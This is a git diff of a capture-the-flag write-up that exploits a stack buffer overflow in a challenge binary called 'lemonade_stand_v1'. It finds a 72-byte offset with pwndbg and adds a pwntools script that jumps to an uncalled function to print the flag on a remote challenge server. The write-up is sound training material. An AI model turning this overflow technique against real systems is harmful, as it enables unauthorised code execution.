@@ -99,7 +99,7 @@ void save_creds(void)
   return;
 }
 ```
-We also found a function that is never been called and it will print the flag if somehow we achieve it.
+We also found a function that is never been called and it will print the flag if somehow we achieve it (grapes()).
 That's our goal.
 
 ```c
@@ -131,7 +131,7 @@ void grapes(void)
 
 First we want to find the offset.\
 We will use pwndbg for this, to create a pattern known as De Bruijn Sequences to fill the padding for the buffer.
-The pwntools calculate the entire 8 digits and found the offset to be 64, but we only care for the first 4 bytes so it will be 64 + 4*2 = 72 bytes
+The pwntools calculate the entire 8 digits and found the offset to be 64, but we only care for the first 4 bytes so it will be 64 + 4 * 2 = 72 bytes
 
 ```shell
 >> 1                                                                                         
@@ -165,16 +165,6 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 *RIP  0x40616a
 ────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────
 Invalid address 0x40616a
-
-
-
-
-
-
-
-
-
-
 ──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
 00:0000│ rsp 0x7fffffffdd60 —▸ 0x7fffffffdd70 —▸ 0x400c00 (__libc_csu_init) ◂— push r15
 01:0008│     0x7fffffffdd68 —▸ 0x400bee (main+72) ◂— jmp 0x400bfd
@@ -196,5 +186,36 @@ Finding cyclic pattern of 8 bytes: b'iaaaaaaa' (hex: 0x6961616161616161)
 Found at offset 64
 ```
 
+Then we wrote a simple python script with pwntools to return to grapes
 
+```python
+#!/usr/bin/env python3
+from pwn import *
 
+elf = context.binary = ELF('./lemonade_stand_v1', checksec = False)
+# p = process(elf.path)
+p = remote('94.237.48.248', 39040)
+# context.log_level = 'debug'
+
+padding = 72 * b'a' 
+# pop_rdi = 0x400c63
+
+payload = flat(
+			padding,
+			elf.symbols.grapes
+				)
+
+p.sendlineafter(b'>> ', b'2')
+p.sendlineafter(b'>> ', b'2')
+p.sendlineafter(b'>> ', b'2')
+p.sendlineafter(b'>> ', b'1')
+p.recvuntil(':')
+p.sendline('leo')
+p.recvuntil(':')
+p.send(payload)
+success(p.recvall())
+```
+
+And we successfully did it!
+
+![Alt Text](img/flag.png)
